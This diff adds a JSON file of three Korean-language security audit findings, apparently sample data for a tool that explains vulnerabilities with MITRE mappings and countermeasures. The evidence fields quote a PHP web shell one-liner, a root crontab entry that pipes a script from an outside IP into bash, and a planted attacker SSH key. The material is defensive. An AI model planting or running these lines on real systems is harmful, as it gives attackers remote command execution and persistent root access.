@@ -1,0 +1,59 @@
+[
+  {
+    "type": "web",
+    "module": "A03-01",
+    "input": {
+      "title": "웹셸 의심 파일 탐지",
+      "module": "A03-01",
+      "status": "취약",
+      "target": "/var/www/html",
+      "evidence": "/var/www/html/uploads/cmd.php:1: <?php eval(base64_decode($_POST[\"cmd\"])); ?>",
+      "reason": "웹 디렉토리에서 웹셸 의심 패턴이 포함된 파일 1건 탐지됨"
+    },
+    "output": {
+      "risk_detail": "웹셸이 존재할 경우 공격자가 웹 서버 권한(www-data)으로 임의 명령을 실행할 수 있으며, 이를 통해 내부 네트워크 탐색, 데이터베이스 접근, 추가 악성코드 배포가 가능합니다. 특히 base64 인코딩으로 탐지를 우회하려는 시도가 확인되어 실제 침해 가능성이 높습니다.",
+      "attack_scenario": "공격자는 파일 업로드 취약점을 이용해 웹셸(cmd.php)을 업로드합니다(T1505.003). 이후 POST 요청으로 base64 인코딩된 명령을 전달하여 시스템 명령을 실행하고(T1059.004), /etc/passwd 열람 및 권한 상승을 시도합니다. 최종적으로 리버스 셸을 확립하여 C2 서버와 통신합니다(T1071.001).",
+      "countermeasure": "즉시 해당 파일을 삭제하고(rm /var/www/html/uploads/cmd.php), 업로드 디렉토리에 PHP 실행을 차단하세요(Apache: <Directory /var/www/html/uploads> php_admin_flag engine off </Directory>). 파일 업로드 기능에 확장자 화이트리스트와 MIME 타입 검증을 적용하고, 웹 루트의 파일 무결성을 모니터링하세요.",
+      "mitre_tactic": "Persistence",
+      "mitre_technique": "T1505.003 - Server Software Component: Web Shell"
+    }
+  },
+  {
+    "type": "system",
+    "module": "A01-03",
+    "input": {
+      "title": "crontab 악성 스케줄 점검",
+      "module": "A01-03",
+      "status": "취약",
+      "target": "/etc/crontab, /etc/cron.d/, /var/spool/cron/",
+      "evidence": "/etc/crontab:15: */5 * * * * root curl http://203.0.113.99/payload.sh | bash",
+      "reason": "crontab에서 악성 의심 스케줄 1건 탐지됨"
+    },
+    "output": {
+      "risk_detail": "crontab에 외부 서버에서 스크립트를 다운로드 후 실행하는 항목이 등록되어 있어, 5분마다 공격자의 최신 페이로드가 root 권한으로 실행됩니다. 이를 통해 백도어 업데이트, 암호화폐 채굴, 데이터 유출 등 다양한 악성 행위가 지속적으로 수행될 수 있습니다.",
+      "attack_scenario": "공격자는 초기 침투 후 crontab에 악성 스케줄을 등록하여 지속성을 확보합니다(T1053.003). 등록된 cron 작업은 5분마다 외부 C2 서버에서 payload.sh를 다운로드하여 bash로 실행합니다(T1059.004). 페이로드 내용은 공격자가 언제든 변경할 수 있어 리버스 셸, 권한 상승 도구, 데이터 유출 스크립트 등으로 교체가 가능합니다(T1105).",
+      "countermeasure": "악성 cron 항목을 즉시 제거하세요(sed -i '/203.0.113.99/d' /etc/crontab). crontab 파일의 무결성을 확인하고(crontab -l -u root), /etc/cron.allow에 허용 사용자만 등록하여 cron 사용을 제한하세요. 외부 통신 차단을 위해 해당 IP를 방화벽에서 차단합니다(iptables -A OUTPUT -d 203.0.113.99 -j DROP).",
+      "mitre_tactic": "Execution",
+      "mitre_technique": "T1053.003 - Scheduled Task/Job: Cron"
+    }
+  },
+  {
+    "type": "system",
+    "module": "A08-01",
+    "input": {
+      "title": "SSH 백도어 의심 키 존재 여부",
+      "module": "A08-01",
+      "status": "취약",
+      "target": "/root/.ssh/authorized_keys",
+      "evidence": "ssh-rsa AAAAB3FakeKeyForTestingOnly== attacker@evil-server",
+      "reason": "SSH 키에서 위험 옵션 또는 의심 패턴 탐지"
+    },
+    "output": {
+      "risk_detail": "root 계정의 authorized_keys에 'attacker@evil-server'라는 코멘트가 포함된 의심 SSH 키가 존재합니다. 이 키를 소유한 공격자는 비밀번호 없이 root로 SSH 접속이 가능하며, 시스템 전체를 완전히 장악할 수 있습니다.",
+      "attack_scenario": "공격자는 초기 침투 후 자신의 SSH 공개키를 /root/.ssh/authorized_keys에 삽입하여 지속적 접근을 확보합니다(T1098.004). 이후 SSH로 root 접속하여(T1021.004) 로그 삭제, 추가 백도어 설치, 내부 네트워크 피벗팅을 수행합니다. 비밀번호 변경이나 PAM 정책으로는 차단할 수 없어 키를 직접 제거해야만 접근이 차단됩니다.",
+      "countermeasure": "의심 키를 즉시 제거하세요(sed -i '/attacker@evil-server/d' /root/.ssh/authorized_keys). authorized_keys 파일 권한을 600으로 설정하고(chmod 600 /root/.ssh/authorized_keys), 등록된 모든 키의 소유자를 확인하세요. sshd_config에 AuthorizedKeysFile 경로를 명시하고 파일 변경 시 알림을 설정하세요(auditctl -w /root/.ssh/authorized_keys -p wa).",
+      "mitre_tactic": "Persistence",
+      "mitre_technique": "T1098.004 - Account Manipulation: SSH Authorized Keys"
+    }
+  }
+]
